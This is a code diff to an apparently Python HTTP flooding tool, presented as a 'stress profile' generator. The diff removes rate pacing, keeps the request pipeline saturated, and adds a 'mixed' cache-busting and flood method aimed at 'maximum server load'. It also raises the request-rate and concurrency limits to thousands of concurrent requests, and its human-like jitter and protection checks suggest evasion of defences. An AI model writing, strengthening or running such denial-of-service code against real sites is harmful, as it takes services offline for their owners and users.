@@ -363,31 +363,47 @@ class TrafficWorker:
                         await asyncio.sleep(0.5)
 
                     elif method_type == "cache_bust":
-                        t = asyncio.create_task(self._cache_buster_request(session))
-                        pending.add(t)
-                        t.add_done_callback(pending.discard)
-                        interval = 1.0 / p.max_rps if p.max_rps > 0 else 0.01
-                        await asyncio.sleep(interval)
+                        # Keep pipeline full up to concurrency cap
+                        while len(pending) < p.concurrency:
+                            t = asyncio.create_task(self._cache_buster_request(session))
+                            pending.add(t)
+                            t.add_done_callback(pending.discard)
+                        await asyncio.sleep(0.005)
+
+                    elif method_type == "mixed":
+                        # Combined: cache-bust + regular flood for maximum server load
+                        while len(pending) < p.concurrency:
+                            if random.random() < 0.6:
+                                t = asyncio.create_task(self._single_request(session, protection_checked))
+                            else:
+                                t = asyncio.create_task(self._cache_buster_request(session))
+                            pending.add(t)
+                            t.add_done_callback(pending.discard)
+                        await asyncio.sleep(0.005)
 
                     elif p.mode == "flood":
-                        batch = min(p.concurrency // 5 + 1, 50)
-                        for _ in range(batch):
+                        # Always keep the pipeline maximally full
+                        slots = p.concurrency - len(pending)
+                        if slots > 0:
+                            for _ in range(min(slots, 100)):
+                                t = asyncio.create_task(self._single_request(session, protection_checked))
+                                pending.add(t)
+                                t.add_done_callback(pending.discard)
+                        await asyncio.sleep(0.005)
+
+                    elif p.mode == "pro":
+                        while len(pending) < p.concurrency:
                             t = asyncio.create_task(self._single_request(session, protection_checked))
                             pending.add(t)
                             t.add_done_callback(pending.discard)
-                        await asyncio.sleep(0.03)
-
-                    elif p.mode == "pro":
-                        t = asyncio.create_task(self._single_request(session, protection_checked))
-                        pending.add(t)
-                        t.add_done_callback(pending.discard)
-                        await human_jitter(2, 20)
+                        await human_jitter(2, 10)
 
                     else:
+                        while len(pending) < p.concurrency:
+                            t = asyncio.create_task(self._single_request(session, protection_checked))
+                            pending.add(t)
+                            t.add_done_callback(pending.discard)
                         interval = 1.0 / p.max_rps if p.max_rps > 0 else 0.01
-                        t = asyncio.create_task(self._single_request(session, protection_checked))
-                        pending.add(t)
-                        t.add_done_callback(pending.discard)
                         await asyncio.sleep(interval)
 
                 if pending:
@@ -468,28 +484,31 @@ def build_stress_profile(
         )
 
     if mode == "flood":
-        rps_map = {"low": 1000, "medium": 2500, "high": 5000, "ultra": 8000}
-        conc_map = {"low": 300, "medium": 700, "high": 1500, "ultra": 3000}
+        rps_map  = {"low": 2000,  "medium": 5000,  "high": 10000, "ultra": 15000}
+        conc_map = {"low": 500,   "medium": 1200,  "high": 2500,  "ultra": 4000}
+        # Default flood method: mixed (cache-bust + regular flood)
+        flood_method = method_type if method_type != "auto" else "mixed"
         return StressProfile(
             target_url=target_url,
             duration=min(duration, 300),
-            concurrency=conc_map.get(intensity, 700),
-            max_rps=rps_map.get(intensity, 2500),
+            concurrency=conc_map.get(intensity, 1200),
+            max_rps=rps_map.get(intensity, 5000),
             mode="flood",
-            method_type=method_type,
+            method_type=flood_method,
             methods=["GET", "POST", "HEAD", "OPTIONS"],
             timeout=2.0,
         )
 
-    rps_map = {"low": 500, "medium": 1200, "high": 2500, "ultra": 5000}
-    conc_map = {"low": 150, "medium": 400, "high": 800, "ultra": 1500}
+    rps_map  = {"low": 800,  "medium": 2000,  "high": 4000,  "ultra": 8000}
+    conc_map = {"low": 200,  "medium": 600,   "high": 1200,  "ultra": 2500}
+    pro_method = method_type if method_type != "auto" else "http_flood"
     return StressProfile(
         target_url=target_url,
         duration=duration,
-        concurrency=conc_map.get(intensity, 400),
-        max_rps=rps_map.get(intensity, 1200),
+        concurrency=conc_map.get(intensity, 600),
+        max_rps=rps_map.get(intensity, 2000),
         mode="pro",
-        method_type=method_type,
+        method_type=pro_method,
         methods=["GET", "POST", "HEAD"],
         timeout=4.0,
     )
